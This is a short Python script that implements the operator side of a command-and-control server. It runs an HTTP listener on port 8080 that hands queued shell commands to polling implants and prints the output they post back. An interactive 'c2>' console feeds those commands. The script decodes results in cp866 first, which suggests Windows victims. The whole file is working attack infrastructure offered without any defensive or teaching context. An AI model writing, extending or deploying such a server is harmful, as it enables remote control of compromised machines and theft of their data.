from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

command = ""

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        global command
        self.send_response(200)
        self.end_headers()
        self.wfile.write(command.encode())
        command = ""

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)
        try:
            result = data.decode('cp866')
        except:
            result = data.decode('utf-8', errors='ignore')
        print(f"\n[+] Result:\n{'-'*40}\n{result}\n{'-'*40}")
        self.send_response(200)
        self.end_headers()

    def log_message(self, *args): pass

def console():
    global command
    print("\n" + "="*40)
    print("C2 Console")
    print("="*40)
    while True:
        cmd = input("\nc2> ").strip()
        if cmd.lower() == 'exit': break
        if cmd:
            command = cmd
            print(f"[*] Sent: {cmd}")

def run():
    server = HTTPServer(('0.0.0.0', 8080), Handler)
    print("[*] C2 on :8080")
    server.serve_forever()

if __name__ == "__main__":
    threading.Thread(target=run, daemon=True).start()
    console()